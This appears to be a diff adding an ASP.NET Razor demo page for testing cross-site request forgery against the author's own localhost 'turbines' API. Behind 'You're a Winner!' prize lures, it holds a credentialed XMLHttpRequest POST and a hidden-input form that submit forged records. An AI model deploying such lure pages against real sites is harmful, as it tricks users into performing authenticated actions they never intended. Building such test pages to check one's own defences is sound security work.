@@ -1,0 +1,44 @@
+﻿@page
+@model IndexModel
+@{
+    ViewData["Title"] = "Home page";
+}
+
+<script>
+    function makeCSRF() {
+        debugger;
+        const request = new XMLHttpRequest();
+        request.withCredentials = true;
+        request.open('post', 'https://localhost:44350/api/turbines/');
+        request.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');  // worked
+        let test = JSON.stringify({ "SerialNumber": "Ololo", "Price": 222 });
+        request.send(test);
+    }
+</script>
+
+<div class="text-center">
+    <br />
+    <h2>Welcome to Cross-Site Request Forgery -- test site</h2>
+</div>
+<br />
+<br />
+
+<div>
+    <h3>Congratulations! You're a Winner!</h3>
+    <br />
+    <button onclick="makeCSRF()" style="background-color: yellowgreen">Click to collect your prize!</button>
+</div>
+
+<br />
+<br />
+<div>
+    <h3>Congratulations! You're a Winner! -- form hidden inputs</h3>
+    <p>works if controller method input params have attribute [FromForm]</p>
+    <form action="https://localhost:44350/api/turbines" method="post">
+        <input type="hidden" name="SerialNumber" value="Forgery-001" />
+        <input type="hidden" name="Price" value=42 />
+        <input style="background-color: yellowgreen" type="submit" value="Click to collect your prize!" />
+    </form>
+</div>
+
+
